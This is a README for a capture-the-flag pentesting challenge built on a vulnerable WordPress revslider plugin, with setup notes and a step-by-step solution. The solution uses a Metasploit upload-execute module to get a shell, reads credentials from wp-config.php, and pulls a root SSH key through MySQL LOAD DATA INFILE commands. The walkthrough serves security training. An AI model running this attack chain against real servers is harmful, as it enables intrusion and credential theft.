# Wordpress Vuln
Pentesting is challenge with a vulnerable wordpress plugin as the initial vulnerability.


## Setup
1. Setup Naumachia with the `config.yml` provided.
    - The files for common can be found here: https://github.com/nategraf/Naumachia-challenges
2. (optional) Add `apacheword` to `/etc/hosts` with the ip address of the web server

## Solution
1. Run `wpscan` on the wordpress website and find that it is using a vulnerable version of revslider
2. Setup metasploit and use the `exploit/unix/webapp/wp_revslider_upload_execute` exploit
3. Get a shell on the webserver
4. Read `note.txt` and `wp-config.php`
5. Use the creds to connect to the db server with mysql (`mysql -h <ip> -u wordpress -p`)
6. Read `/backup/id_rsa` off the db server by executing the following sql commands:
    - `use wordpress;`
    - `CREATE TABLE files (text VARCHAR(1024));`
    - `LOAD DATA INFILE '/backup/id_rsa' INTO TABLE files;`
    - `SELECT * FROM files;`
7. Copy `id_rsa` to local file
8. Use `id_rsa` to ssh into the webserver as root (`ssh -i id_rsa root@<ip>`)
9. Read `flag.txt`
    
